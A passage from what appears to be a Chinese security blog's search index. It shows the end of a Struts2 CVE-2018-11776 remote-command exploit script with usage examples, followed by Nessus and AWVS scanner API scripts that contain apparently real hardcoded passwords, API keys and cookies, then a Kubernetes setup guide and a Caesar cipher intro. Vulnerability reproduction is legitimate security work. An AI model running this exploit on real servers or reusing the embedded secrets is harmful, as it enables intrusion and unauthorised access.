range(0, len(str1), 2): payload1 += &#39;%&#39; + str1[i:i + 2] payload2 = &quot;&quot; for i in range(0, len(str2), 2): payload2 += &#39;%&#39; + str2[i:i + 2] url1 = host + &#39;/&#39; + payload1 + &#39;/&#39; + path url2 = host + &#39;/&#39; + payload2 + &#39;/&#39; + path res1 = requests.get(url1, allow_redirects=False) res2 = requests.get(url2, allow_redirects=False) if res1.status_code == 200 and res2.status_code != 200: print(&quot;Exploit successful:&quot;) print(res1.content) elif res2.status_code == 200 and res1.status_code != 200: print(&quot;Exploit successful:&quot;) print(res2.content) else: print(&#39;The target is likely unvulnerable,mabye your struts2 version is too high!&#39;) if __name__ == &#39;__main__&#39;: if len(sys.argv) &lt; 4: print(&quot;Usage: python s2-057-exp.py http://www.xxx.com/ {command} {The path such as:actionChain1.action}&quot;) else: expliot(sys.argv[1].strip(), sys.argv[2], sys.argv[3].strip()) 使用方法： python2 struts2.py http://www.xxx.com/ {command} {The path such as:actionChain1.action} 例如:python2 struts2.py http://192.168.50.197:8080/struts2-showcase/ &quot;ipconfig&quot; actionChain1.action 参考文章CVE-2018-11776漏洞从搭建到复现","categories":[{"name":"web安全","slug":"web安全","permalink":"https://yubenliu.cn/categories/web安全/"}],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://yubenliu.cn/tags/漏洞复现/"},{"name":"CVE-2018-11776","slug":"CVE-2018-11776","permalink":"https://yubenliu.cn/tags/CVE-2018-11776/"},{"name":"struts2","slug":"struts2","permalink":"https://yubenliu.cn/tags/struts2/"}]},{"title":"nessus与awvs API","slug":"scan","date":"2019-08-02T06:20:00.000Z","updated":"2019-11-12T07:01:57.539Z","comments":true,"path":"2019/08/02/scan/","link":"","permalink":"https://yubenliu.cn/2019/08/02/scan/","excerpt":"前言 最近在做自动化安全扫描器开发，在项目中想引用比较知名的扫描器，如是整理了一下API作为参考","text":"前言 最近在做自动化安全扫描器开发，在项目中想引用比较知名的扫描器，如是整理了一下API作为参考 Nessus 6.x版本#!/usr/bin/env python # -*- coding: utf-8 -*- # @Time : 2017/8/21 下午4:08 # @Author : Yu BenLiu # @Site : QVQ # @File : nessus_api_6.py.py # @Software: PyCharm import sys # sys.path.append(&quot;..&quot;) import requests, json, csv, os, time from requests.packages.urllib3.exceptions import InsecureRequestWarning requests.packages.urllib3.disable_warnings(InsecureRequestWarning) # from core.settings import talscan_config,redis_task from host_type_check import * talscan_config = {&quot;report_filters&quot;: { &quot;awvs_white_list&quot;: [&quot;orange&quot;, &quot;red&quot;, &quot;blue&quot;], # green,blue,orange,red四种级别 &quot;nessus_white_list&quot;: [&quot;High&quot;, &quot;Medium&quot;, &quot;Low&quot;], &quot;bug_black_list&quot;: [ # 漏洞黑名单，过滤掉一些危害等级高，但没什么卵用的洞 &quot;User credentials are sent in clear text&quot; ] } } class Work(object): def __init__(self, scan_id=&quot;&quot;, scan_uuid=&quot;&quot;,scan_target=&quot;&quot;, scan_type=&quot;&quot;, scan_args=&quot;&quot;, back_fn=None): self.api_url = &#39;https://192.168.29.198:8834&#39; self.username = &quot;root&quot; self.password = &quot;ybl8651073&quot; self.filter = talscan_config[&quot;report_filters&quot;] self.report_save_dir = &#39;/tmp/&#39; self.verify = False self.token = &#39;&#39; self.enable = True self.scan_uuid=scan_uuid self.scan_id = scan_id self.target = scan_target self.scan_type = scan_type self.args = scan_args self.back_fn = back_fn self.result = {} def connect(self, method, resource, data=None, params=None): headers = {&#39;X-Cookie&#39;: &#39;token={0}&#39;.format(self.token), &#39;content-type&#39;: &#39;application/json&#39;} data = json.dumps(data) try: if method == &#39;POST&#39;: r = requests.post(str(self.api_url + resource), data=data, headers=headers, verify=self.verify) elif method == &#39;PUT&#39;: r = requests.put(str(self.api_url + resource), data=data, headers=headers, verify=self.verify) elif method == &#39;DELETE&#39;: r = requests.delete(str(self.api_url + resource), data=data, headers=headers, verify=self.verify) else: r = requests.get(str(self.api_url + resource), params=params, headers=headers, verify=self.verify) except Exception, e: print e return {&quot;status&quot;: 3} if r.status_code == 200: try: data = r.json() except: data = r.content result = {&quot;status&quot;: 1, &quot;data&quot;: data} return result else: result = {&quot;status&quot;: 3} return result def nessus_login(self): login = {&#39;username&#39;: self.username, &#39;password&#39;: self.password} data = self.connect(&#39;POST&#39;, &#39;/session&#39;, data=login) print data status = data[&quot;status&quot;] print status if status == 1: result = {&quot;status&quot;: 1, &quot;data&quot;: data[&quot;data&quot;][&#39;token&#39;]} print result return result else: result = {&quot;status&quot;: 0} print result return result def nessus_process_status(self, sid): # canceled,running,completed data = self.nessus_login() status = data[&quot;status&quot;] if status == 1: token = data[&quot;data&quot;] else: result = {&quot;status&quot;: 0} return result headers = {&#39;X-Cookie&#39;: &#39;token={0}&#39;.format(token), &#39;content-type&#39;: &#39;application/json&#39;} url = self.api_url + &#39;/scans/&#39; data = requests.get(url=url, params=None, headers=headers, verify=self.verify) res = data.json() info1=res[&#39;scans&#39;] print info1 try: return info1 except: return {&quot;status&quot;: 0} def nessus_policies(self,): data = self.nessus_login() status = data[&quot;status&quot;] if status == 1: token = data[&quot;data&quot;] else: result = {&quot;status&quot;: 0} return result headers = {&#39;X-Cookie&#39;: &#39;token={0}&#39;.format(token), &#39;content-type&#39;: &#39;application/json&#39;} url = self.api_url + &#39;/policies/&#39; data = requests.get(url=url, params=None, headers=headers, verify=self.verify) res = data.json() info=res[&#39;policies&#39;] print info try: return info except: return {&quot;status&quot;: 0} def nessus_add_task(self): if is_domain(self.target) or is_host(self.target): create_data = { &quot;uuid&quot;: self.scan_uuid, # &quot;uuid&quot;: &#39;ad629e16-03b6-8c1d-cef6-ef8c9dd3c658d24bd260ef5f9e66&#39;,#选择策略 &quot;settings&quot;: { &quot;name&quot;: self.scan_id, &quot;scanner_id&quot;: &quot;1&quot;, &quot;text_targets&quot;: self.target, &quot;enabled&quot;: False, &quot;launch_now&quot;: True, } } post_data = json.dumps(create_data) data = self.nessus_login() status = data[&quot;status&quot;] if status == 1: token = data[&quot;data&quot;] else: print &#39;99&#39; return {&quot;status&quot;: 2, &quot;data&quot;: &quot;NESSUS &gt;&gt;&gt;&gt; :登陆失败&quot;} headers = {&#39;X-Cookie&#39;: &#39;token={0}&#39;.format(token), &#39;content-type&#39;: &#39;application/json&#39;} r = requests.post(url=str(self.api_url + &#39;/scans&#39;), data=post_data, headers=headers, verify=self.verify) if r.status_code == 200: try: get_id = r.json() except: get_id = r.content sid = get_id[&#39;scan&#39;][&#39;id&#39;] result = {&quot;status&quot;: 1, &quot;data&quot;: sid} return result else: result = {&quot;status&quot;: 2, &quot;data&quot;: &quot;NESSUS &gt;&gt;&gt;&gt; :增加任务失败&quot;} return result else: return {&quot;status&quot;: 2, &quot;data&quot;: &quot;NESSUS &gt;&gt;&gt;&gt; :格式错误&quot;} def nessus_stop_task(self, sid): data = self.nessus_login() status = data[&quot;status&quot;] if status == 1: token = data[&quot;data&quot;] else: result = {&quot;status&quot;: 0} return result headers = {&#39;X-Cookie&#39;: &#39;token={0}&#39;.format(token), &#39;content-type&#39;: &#39;application/json&#39;} url = str(self.api_url + &#39;/scans/{0}/stop/&#39;.format(sid)) r = requests.post(url=url, params=None, headers=headers, verify=self.verify) if r.status_code == 200: result = {&quot;status&quot;: 1} return result else: result = {&quot;status&quot;: 0} return result def nessus_report_task(self, taskid, sid): bug_list = [] data = self.nessus_login() status = data[&quot;status&quot;] if status == 1: token = data[&quot;data&quot;] else: result = {&quot;status&quot;: 0} return result headers = {&#39;X-Cookie&#39;: &#39;token={0}&#39;.format(token), &#39;content-type&#39;: &#39;application/json&#39;} url = str(self.api_url + &#39;/scans/{0}/export&#39;.format(sid)) data = json.dumps({&quot;format&quot;: &quot;csv&quot;}) r = requests.post(url=url, data=data, headers=headers, verify=self.verify) try: file = r.json()[&#39;token&#39;] except: result = {&quot;status&quot;: 0} return result down_file_url = str(self.api_url + &#39;/scans/exports/{0}/download&#39;.format(file)) r = requests.get(url=down_file_url, headers=headers, verify=self.verify) csv_file = str(self.report_save_dir + &quot;{0}_nessus.csv&quot;.format(str(taskid))) f = open(csv_file, &#39;wb&#39;) data = r.content f.write(data) f.close() csv_open_file = open(csv_file, &#39;rb&#39;) csvReader = csv.reader(csv_open_file) for row in csvReader: parameterStr = &#39;,&#39;.join(row) parameters = parameterStr.split(&#39;,&#39;) PID = parameters[0] CVE = parameters[1] CVSS = parameters[2] Risk = parameters[3] Host = parameters[4] Protocol = parameters[5] Port = parameters[6] Name = parameters[7] Synopsis = parameters[8] Description = parameters[9] Solution = parameters[10] See_Also = parameters[11] Plugin_Output = parameters[12] bug_name = str(Name) bug_level = str(Risk) bug_summary = str(Synopsis) + &quot;\\r\\n&quot; + str(Description) bug_detail = &quot;Bug Port : &quot; + str(Port) + &quot;\\r\\n&quot; + &quot;CVE : &quot; + str(CVE) bug_repair = str(Solution) + &quot;\\r\\n&quot; + str(Plugin_Output) if str(Risk) in self.filter[&#39;nessus_white_list&#39;]: bug_list.append( {&#39;bug_name&#39;: bug_name, &#39;bug_level&#39;: bug_level, &#39;bug_summary&#39;: bug_summary, &#39;bug_detail&#39;: bug_detail, &#39;bug_repair&#39;: bug_repair}) csv_open_file.close() # os.remove(csv_file) if len(bug_list) &gt; 0: result = {&quot;status&quot;: 1, &quot;data&quot;: bug_list} return bug_list else: result = {&quot;status&quot;: 0} return result def run(self): result = self.nessus_add_task() status = result[&quot;status&quot;] if status == 1: nessus_id = int(result[&quot;data&quot;]) while True: time.sleep(5) nessus_process = self.nessus_process_status(nessus_id) nessus_status = nessus_process[&quot;status&quot;] if nessus_status == 1: nessus_process_data = nessus_process[&quot;data&quot;].encode(&quot;utf8&quot;) if nessus_process_data == &quot;completed&quot;: break time.sleep(20) # 推迟20秒，获取报告;nessus任务进程到100有部分延迟结束时间 nessus_report = self.nessus_report_task(self.scan_id, nessus_id) nessus_report_status = nessus_report[&quot;status&quot;] if nessus_report_status == 1: nessus_report_data = nessus_report[&quot;data&quot;] data = [] for line in nessus_report_data: task_result = { &quot;scan_id&quot;: self.scan_id, &quot;model&quot;: &quot;nessus&quot;, &quot;bug_author&quot;: &quot;bing&quot;, &quot;bug_name&quot;: line[&quot;bug_name&quot;], &quot;bug_level&quot;: line[&quot;bug_level&quot;], &quot;bug_summary&quot;: line[&quot;bug_summary&quot;], &quot;bug_detail&quot;: line[&quot;bug_detail&quot;], &quot;bug_repair&quot;: line[&quot;bug_repair&quot;] } redis_task.sadd(&quot;nessus_result&quot;, task_result) print task_result # 任务最终结束 final_result = {&quot;status&quot;: 1, &quot;scan_id&quot;: self.scan_id, &quot;model&quot;: &quot;nessus&quot;} redis_task.sadd(&quot;nessus_result&quot;, final_result) print final_result else: # 任务最终结束 final_result = {&quot;status&quot;: 1, &quot;scan_id&quot;: self.scan_id, &quot;model&quot;: &quot;nessus&quot;} redis_task.sadd(&quot;nessus_result&quot;, final_result) print final_result elif status == 2: nessus_error = result[&quot;data&quot;] final_result = {&quot;status&quot;: 2, &quot;data&quot;: nessus_error, &quot;scan_id&quot;: self.scan_id, &quot;model&quot;: &quot;nessus&quot;} redis_task.sadd(&quot;nessus_result&quot;, final_result) print final_result #t = Work(&quot;1234455&quot;,&quot;ad629e16-03b6-8c1d-cef6-ef8c9dd3c658d24bd260ef5f9e66&quot;,&quot;www.baidu.com&quot;) #s = t.nessus_report_task(5,84) #print s Awvs 最新的api#!/usr/bin/env python # -*- coding: utf-8 -*- # @Time : 2017/8/22 下午3:08 # @Author : Yu BenLiu # @Site : QVQ # @File : awvs_api_11.py.py # @Software: PyCharm import json import requests import requests.packages.urllib3 &#39;&#39;&#39; import requests.packages.urllib3.util.ssl_ requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = &#39;ALL&#39; or pip install requests[security] &#39;&#39;&#39; requests.packages.urllib3.disable_warnings() tarurl = &quot;https://192.168.29.207:3443/&quot; apikey = &quot;1986ad8c0a5b3df4d7028d5f3c06e936c38438d15a1fb4f4588e034d3c3490fef&quot; headers = {&quot;X-Auth&quot;: apikey, &quot;content-type&quot;: &quot;application/json&quot;} def addtask(url=&#39;&#39;): # 添加任务 data = {&quot;address&quot;: url, &quot;description&quot;: url, &quot;criticality&quot;: &quot;10&quot;} try: response = requests.post(tarurl + &quot;/api/v1/targets&quot;, data=json.dumps(data), headers=headers, timeout=30, verify=False) result = json.loads(response.content) return result[&#39;target_id&#39;] except Exception as e: print(str(e)) return def startscan(url): # 先获取全部的任务.避免重复 # 添加任务获取target_id # 开始扫描 &#39;&#39;&#39; 11111111-1111-1111-1111-111111111112 High Risk Vulnerabilities 11111111-1111-1111-1111-111111111115 Weak Passwords 11111111-1111-1111-1111-111111111117 Crawl Only 11111111-1111-1111-1111-111111111116 Cross-site Scripting Vulnerabilities 11111111-1111-1111-1111-111111111113 SQL Injection Vulnerabilities 11111111-1111-1111-1111-111111111118 quick_profile_2 0 {&quot;wvs&quot;: {&quot;profile&quot;: &quot;continuous_quick&quot;}} 11111111-1111-1111-1111-111111111114 quick_profile_1 0 {&quot;wvs&quot;: {&quot;profile&quot;: &quot;continuous_full&quot;}} 11111111-1111-1111-1111-111111111111 Full Scan 1 {&quot;wvs&quot;: {&quot;profile&quot;: &quot;Default&quot;}} &#39;&#39;&#39; targets = getscan() if url in targets: return &quot;repeat&quot; else: target_id = addtask(url) data = {&quot;target_id&quot;: target_id, &quot;profile_id&quot;: &quot;11111111-1111-1111-1111-111111111111&quot;, &quot;schedule&quot;: {&quot;disable&quot;: False, &quot;start_date&quot;: None, &quot;time_sensitive&quot;: False}} try: response = requests.post(tarurl + &quot;/api/v1/scans&quot;, data=json.dumps(data), headers=headers, timeout=30, verify=False) result = json.loads(response.content) return result[&#39;target_id&#39;] except Exception as e: print(str(e)) return def getstatus(scan_id): # 获取scan_id的扫描状况 try: response = requests.get(tarurl + &quot;/api/v1/scans/&quot; + str(scan_id), headers=headers, timeout=30, verify=False) result = json.loads(response.content) status = result[&#39;current_session&#39;][&#39;status&#39;] # 如果是completed 表示结束.可以生成报告 if status == &quot;completed&quot;: return getreports(scan_id) else: return result[&#39;current_session&#39;][&#39;status&#39;] except Exception as e: print(str(e)) return def delete_scan(scan_id): # 删除scan_id的扫描 try: response = requests.delete(tarurl + &quot;/api/v1/scans/&quot; + str(scan_id), headers=headers, timeout=30, verify=False) # 如果是204 表示删除成功 if response.status_code == &quot;204&quot;: return True else: return False except Exception as e: print(str(e)) return def delete_target(scan_id): # 删除scan_id的扫描 try: response = requests.delete(tarurl + &quot;/api/v1/targets/&quot; + str(scan_id), headers=headers, timeout=30, verify=False) # 如果是204 表示删除成功 if response.status_code == &quot;204&quot;: return True else: return False except Exception as e: print(str(e)) return def stop_scan(scan_id): # 停止scan_id的扫描 try: response = requests.post(tarurl + &quot;/api/v1/scans/&quot; + str(scan_id + &quot;/abort&quot;), headers=headers, timeout=30, verify=False) # 如果是204 表示停止成功 if response.status_code == &quot;204&quot;: return True else: return False except Exception as e: print(str(e)) return def scan_status(): # 停止scan_id的扫描 try: response = requests.get(tarurl + &quot;/api/v1/me/stats&quot;, headers=headers, timeout=30, verify=False) result = json.loads(response.content) print result return result except Exception as e: print(str(e)) return def getreports(scan_id): # 获取scan_id的扫描报告 &#39;&#39;&#39; 11111111-1111-1111-1111-111111111111 Developer 21111111-1111-1111-1111-111111111111 XML 11111111-1111-1111-1111-111111111119 OWASP Top 10 2013 11111111-1111-1111-1111-111111111112 Quick &#39;&#39;&#39; data = {&quot;template_id&quot;: &quot;11111111-1111-1111-1111-111111111111&quot;, &quot;source&quot;: {&quot;list_type&quot;: &quot;scans&quot;, &quot;id_list&quot;: [scan_id]}} try: response = requests.post(tarurl + &quot;/api/v1/reports&quot;, data=json.dumps(data), headers=headers, timeout=30, verify=False) result = response.headers report = result[&#39;Location&#39;].replace(&#39;/api/v1/reports/&#39;, &#39;/reports/download/&#39;) return tarurl.rstrip(&#39;/&#39;) + report except Exception as e: print(str(e)) return finally: delete_scan(scan_id) def config(url): target_id = addtask(url) # 获取全部的扫描状态 data = { &quot;excluded_paths&quot;: [&quot;manager&quot;, &quot;phpmyadmin&quot;, &quot;testphp&quot;], &quot;user_agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36&quot;, &quot;custom_headers&quot;: [&quot;Accept: */*&quot;, &quot;Referer:&quot; + url, &quot;Connection: Keep-alive&quot;], &quot;custom_cookies&quot;: [{&quot;url&quot;: url, &quot;cookie&quot;: &quot;UM_distinctid=15da1bb9287f05-022f43184eb5d5-30667808-fa000-15da1bb9288ba9; PHPSESSID=dj9vq5fso96hpbgkdd7ok9gc83&quot;}], &quot;scan_speed&quot;: &quot;moderate&quot;, # sequential/slow/moderate/fast more and more fast &quot;technologies&quot;: [&quot;PHP&quot;], # ASP,ASP.NET,PHP,Perl,Java/J2EE,ColdFusion/Jrun,Python,Rails,FrontPage,Node.js # 代理 &quot;proxy&quot;: { &quot;enabled&quot;: False, &quot;address&quot;: &quot;127.0.0.1&quot;, &quot;protocol&quot;: &quot;http&quot;, &quot;port&quot;: 8080, &quot;username&quot;: &quot;aaa&quot;, &quot;password&quot;: &quot;bbb&quot; }, # 无验证码登录 &quot;login&quot;: { &quot;kind&quot;: &quot;automatic&quot;, &quot;credentials&quot;: { &quot;enabled&quot;: False, &quot;username&quot;: &quot;test&quot;, &quot;password&quot;: &quot;test&quot; } }, # 401认证 &quot;authentication&quot;: { &quot;enabled&quot;: False, &quot;username&quot;: &quot;test&quot;, &quot;password&quot;: &quot;test&quot; } } try: res = requests.patch(tarurl + &quot;/api/v1/targets/&quot; + str(target_id) + &quot;/configuration&quot;, data=json.dumps(data), headers=headers, timeout=30 * 4, verify=False) data = {&quot;target_id&quot;: target_id, &quot;profile_id&quot;: &quot;11111111-1111-1111-1111-111111111111&quot;, &quot;schedule&quot;: {&quot;disable&quot;: False, &quot;start_date&quot;: None, &quot;time_sensitive&quot;: False}} try: response = requests.post(tarurl + &quot;/api/v1/scans&quot;, data=json.dumps(data), headers=headers, timeout=30, verify=False) result = json.loads(response.content) return result[&#39;target_id&#39;] except Exception as e: print(str(e)) return except Exception as e: raise e def getvulnerabilities(): # 停止scan_id的扫描 try: response = requests.get(tarurl + &quot;/api/v1/vulnerabilities&quot;, headers=headers, timeout=30, verify=False) result = json.loads(response.content) print result return result except Exception as e: print(str(e)) return def getscan(): # 获取全部的扫描状态 targets = [] try: response = requests.get(tarurl + &quot;/api/v1/scans&quot;, headers=headers, timeout=30, verify=False) results = json.loads(response.content) return results except Exception as e: raise e def getvulnerabilitiesinfo(sid): # 停止scan_id的扫描 try: response = requests.get(tarurl + &quot;/api/v1/vulnerabilities/&quot;+sid, headers=headers, timeout=30, verify=False) result = json.loads(response.content) print result return result except Exception as e: print(str(e)) return if __name__ == &#39;__main__&#39;: info=getscan() print info print type(info) #print getreports(&#39;f22d4aa1-e2de-4307-bd9d-ddf3aa531bc1&#39;,locals()) # print config(&#39;http://testhtml5.vulnweb.com/&#39;)","categories":[{"name":"漏扫","slug":"漏扫","permalink":"https://yubenliu.cn/categories/漏扫/"}],"tags":[{"name":"扫描器","slug":"扫描器","permalink":"https://yubenliu.cn/tags/扫描器/"},{"name":"工具","slug":"工具","permalink":"https://yubenliu.cn/tags/工具/"},{"name":"自动化","slug":"自动化","permalink":"https://yubenliu.cn/tags/自动化/"}]},{"title":"kubernetes的部署","slug":"kubernetes的部署","date":"2019-08-01T06:20:00.000Z","updated":"2019-11-12T07:01:57.543Z","comments":true,"path":"2019/08/01/kubernetes的部署/","link":"","permalink":"https://yubenliu.cn/2019/08/01/kubernetes的部署/","excerpt":"什么是kubernetes Kubernetes是Google开源的容器集群管理系统，其提供应用部署、维护、 扩展机制等功能，利用Kubernetes能方便地管理跨机器运行容器化的应用","text":"什么是kubernetes Kubernetes是Google开源的容器集群管理系统，其提供应用部署、维护、 扩展机制等功能，利用Kubernetes能方便地管理跨机器运行容器化的应用 ##主要的功能1) 使用Docker对应用程序包装(package)、实例化(instantiate)、运行(run)。 2) 以集群的方式运行、管理跨机器的容器。 3) 解决Docker跨机器容器之间的通讯问题。 4) Kubernetes的自我修复机制使得容器集群总是运行在用户期望的状态。 Kubernetes主要概念一 PodsPod是Kubernetes的基本操作单元，把相关的一个或多个容器构成一个Pod，通常Pod里的容器运行相同的应用。Pod包含的容器运行在同一个Minion(Host)上，看作一个统一管理单元，共享相同的volumes和network namespace/IP和Port空间。 二 ServicesServices也是Kubernetes的基本操作单元，是真实应用服务的抽象，每一个服务后面都有很多对应的容器来支持，通过Proxy的port和服务selector决定服务请求传递给后端提供服务的容器，对外表现为一个单一访问接口，外部不需要了解后端如何运行，这给扩展或维护后端带来很大的好处。 三 Replication ControllersReplication Controller确保任何时候Kubernetes集群中有指定数量的pod副本(replicas)在运行， 如果少于指定数量的pod副本(replicas)，Replication Controller会启动新的Container，反之会杀死多余的以保证数量不变。Replication Controller使用预先定义的pod模板创建pods，一旦创建成功，pod 模板和创建的pods没有任何关联，可以修改pod 模板而不会对已创建pods有任何影响，也可以直接更新通过Replication Controller创建的pods。对于利用pod 模板创建的pods，Replication Controller根据label selector来关联，通过修改pods的label可以删除对应的pods。Replication Controller主要有如下用法：1) Rescheduling如上所述，Replication Controller会确保Kubernetes集群中指定的pod副本(replicas)在运行， 即使在节点出错时。2) Scaling通过修改Replication Controller的副本(replicas)数量来水平扩展或者缩小运行的pods。3) Rolling updatesReplication Controller的设计原则使得可以一个一个地替换pods来rolling updates服务。4) Multiple release tracks如果需要在系统中运行multiple release的服务，Replication Controller使用labels来区分multiple release tracks。 四 LabelsLabels是用于区分Pod、Service、Replication Controller的key/value键值对，Pod、Service、 Replication Controller可以有多个label，但是每个label的key只能对应一个value。Labels是Service和Replication Controller运行的基础，为了将访问Service的请求转发给后端提供服务的多个容器，正是通过标识容器的labels来选择正确的容器。同样，Replication Controller也使用labels来管理通过pod 模板创建的一组容器，这样Replication Controller可以更加容易，方便地管理多个容器，无论有多少容器。 Kubernetes构件Kubenetes整体框架，主要包括kubecfg、Master API Server、Kubelet、Minion(Host)以及Proxy 一 MasterMaster定义了Kubernetes 集群Master/API Server的主要声明，包括Pod Registry、Controller Registry、Service Registry、Endpoint Registry、Minion Registry、Binding Registry、RESTStorage以及Client, 是client(Kubecfg)调用Kubernetes API，管理Kubernetes主要构件Pods、Services、Minions、容器的入口。Master由API Server、Scheduler以及Registry等组成。从下图可知Master的工作流主要分以下步骤：1) Kubecfg将特定的请求，比如创建Pod，发送给Kubernetes Client。2) Kubernetes Client将请求发送给API server。3) API Server根据请求的类型，比如创建Pod时storage类型是pods，然后依此选择何种REST Storage API对请求作出处理。4) REST Storage API对的请求作相应的处理。5) 将处理的结果存入高可用键值存储系统Etcd中。6) 在API Server响应Kubecfg的请求后，Scheduler会根据Kubernetes Client获取集群中运行Pod及Minion信息。7) 依据从Kubernetes Client获取的信息，Scheduler将未分发的Pod分发到可用的Minion节点上。下面是Master的主要构件的详细介绍：图3-2 Master主要构件及工作流 Minion RegistryMinion Registry负责跟踪Kubernetes 集群中有多少Minion(Host)。Kubernetes封装Minion Registry成实现Kubernetes API Server的RESTful API接口REST，通过这些API，我们可以对Minion Registry做Create、Get、List、Delete操作，由于Minon只能被创建或删除，所以不支持Update操作，并把Minion的相关配置信息存储到etcd。除此之外，Scheduler算法根据Minion的资源容量来确定是否将新建Pod分发到该Minion节点。 Pod RegistryPod Registry负责跟踪Kubernetes集群中有多少Pod在运行，以及这些Pod跟Minion是如何的映射关系。将Pod Registry和Cloud Provider信息及其他相关信息封装成实现Kubernetes API Server的RESTful API接口REST。通过这些API，我们可以对Pod进行Create、Get、List、Update、Delete操作，并将Pod的信息存储到etcd中，而且可以通过Watch接口监视Pod的变化情况，比如一个Pod被新建、删除或者更新。 Service RegistryService Registry负责跟踪Kubernetes集群中运行的所有服务。根据提供的Cloud Provider及Minion Registry信息把Service Registry封装成实现Kubernetes API Server需要的RESTful API接口REST。利用这些接口，我们可以对Service进行Create、Get、List、Update、Delete操作，以及监视Service变化情况的watch操作，并把Service信息存储到etcd。 Controller RegistryController Registry负责跟踪Kubernetes集群中所有的Replication Controller，Replication Controller维护着指定数量的pod 副本(replicas)拷贝，如果其中的一个容器死掉，Replication Controller会自动启动一个新的容器，如果死掉的容器恢复，其会杀死多出的容器以保证指定的拷贝不变。通过封装Controller Registry为实现Kubernetes API Server的RESTful API接口REST， 利用这些接口，我们可以对Replication Controller进行Create、Get、List、Update、Delete操作，以及监视Replication Controller变化情况的watch操作，并把Replication Controller信息存储到etcd。 Endpoints RegistryEndpoints Registry负责收集Service的endpoint，比如Name：”mysql”，Endpoints: [“10.10.1.1:1909”，”10.10.2.2:8834”]，同Pod Registry，Controller Registry也实现了Kubernetes API Server的RESTful API接口，可以做Create、Get、List、Update、Delete以及watch操作。 Binding RegistryBinding包括一个需要绑定Pod的ID和Pod被绑定的Host，Scheduler写Binding Registry后，需绑定的Pod被绑定到一个host。Binding Registry也实现了Kubernetes API Server的RESTful API接口，但Binding Registry是一个write-only对象，所有只有Create操作可以使用， 否则会引起错误。 SchedulerScheduler收集和分析当前Kubernetes集群中所有Minion节点的资源(内存、CPU)负载情况，然后依此分发新建的Pod到Kubernetes集群中可用的节点。由于一旦Minion节点的资源被分配给Pod，那这些资源就不能再分配给其他Pod， 除非这些Pod被删除或者退出， 因此，Kubernetes需要分析集群中所有Minion的资源使用情况，保证分发的工作负载不会超出当前该Minion节点的可用资源范围。具体来说，Scheduler做以下工作：1) 实时监测Kubernetes集群中未分发的Pod。2) 实时监测Kubernetes集群中所有运行的Pod，Scheduler需要根据这些Pod的资源状况安全地将未分发的Pod分发到指定的Minion节点上。3) Scheduler也监测Minion节点信息，由于会频繁查找Minion节点，Scheduler会缓存一份最新的信息在本地。4) 最后，Scheduler在分发Pod到指定的Minion节点后，会把Pod相关的信息Binding写回API Server。 Kubelet图3-3 Kubernetes详细构件根据上图3-3可知Kubelet是Kubernetes集群中每个Minion和Master API Server的连接点，Kubelet运行在每个Minion上，是Master API Server和Minion之间的桥梁，接收Master API Server分配给它的commands和work，与持久性键值存储etcd、file、server和http进行交互，读取配置信息。Kubelet的主要工作是管理Pod和容器的生命周期，其包括Docker Client、Root Directory、Pod Workers、Etcd Client、Cadvisor Client以及Health Checker组件，具体工作如下：1) 通过Worker给Pod异步运行特定的Action。2) 设置容器的环境变量。3) 给容器绑定Volume。4) 给容器绑定Port。5) 根据指定的Pod运行一个单一容器。6) 杀死容器。7) 给指定的Pod创建network 容器。8) 删除Pod的所有容器。9) 同步Pod的状态。10) 从Cadvisor获取container info、 pod info、root info、machine info。11) 检测Pod的容器健康状态信息。12) 在容器中运行命令。 ProxyProxy是为了解决外部网络能够访问跨机器集群中容器提供的应用服务而设计的，从上图3-3可知Proxy服务也运行在每个Minion上。Proxy提供TCP/UDP sockets的proxy，每创建一种Service，Proxy主要从etcd获取Services和Endpoints的配置信息，或者也可以从file获取，然后根据配置信息在Minion上启动一个Proxy的进程并监听相应的服务端口，当外部请求发生时，Proxy会根据Load Balancer将请求分发到后端正确的容器处 安装使用 准备工作 对象 版本 ip 备注 k8s-master centos7 192.168.29.11 K8S的master所在主机 etcd-server centos7 192.168.29.11 etcd服务所在主机，与master在同一机器 k8s-slave centos7 192.168.29.12 K8S节点所在主机 安装主要程序 192.168.29.11执行以下命令，安装kubernetes和etcd yum -y install --enablerepo=virt7-docker-common-release kubernetes etcd 禁用防火墙systemctl disable iptables-services firewalld systemctl stop iptables-services firewalld 192.168.29.11 上主机配置一 修改文件/etc/kubernetes/config(所有节点)注意，master和slave主机都要修改指定master主机的ip，文件内容如下： 二 修改配置文件/etc/etcd/etcd.conf,确保etcd监听所有地址。内容如下 三 修改配置文件/etc/kubernetes/apiserver 四 修改配置文件/etc/kubernetes/controller-manager，定义slave主机ip地址 在master主机上，启动服务for SERVICES in etcd kube-apiserver kube-controller-manager kube-scheduler; do systemctl restart $SERVICES systemctl enable $SERVICES systemctl status $SERVICES done slave节点配置yum 安装kubernetes yum -y install kubernetes flannel slave 配置文件修改一 .修改kubernetes配置文件，指定master/etc/kubernetes/config 二 配置kubelet服务 /etc/kubernetes/kubelet 在slave主机上，启动服务for SERVICES in kube-proxy kubelet docker flanneld; do systemctl restart $SERVICES systemctl enable $SERVICES systemctl status $SERVICES done ###验证","categories":[{"name":"docker","slug":"docker","permalink":"https://yubenliu.cn/categories/docker/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://yubenliu.cn/tags/docker/"},{"name":"Linux","slug":"Linux","permalink":"https://yubenliu.cn/tags/Linux/"}]},{"title":"凯撒密码的加密解密","slug":"kaisa","date":"2018-09-07T01:25:00.000Z","updated":"2019-11-12T07:01:57.539Z","comments":true,"path":"2018/09/07/kaisa/","link":"","permalink":"https://yubenliu.cn/2018/09/07/kaisa/","excerpt":"前言 凯撒密码作为一种最为古老的对称加密体制，在古罗马的时候都已经很流行，他的基本思想是：通过把字母移动一定的位数来实现加密和解密。明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。例如，当偏移量是3的时候，所有的字母A将被替换成D，B变成E，以此类推X将变成A，Y变成B，Z变成C。由此可见，位数就是凯撒密码加密和解密的密钥。","text":"前言 凯撒密码作为一种最为古老的对称加密体制，在古罗马的时候都已经很流行，他的基本思想是：通过把字母移动一定的位数来实现加密和解密。明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。例如，当偏移量是3的时候，所有的字母A将被替换成D，B变成E，以此类推X将变成A，Y变成B，Z变成C。由此可见，位数就是凯撒密码加密和解密的密钥。 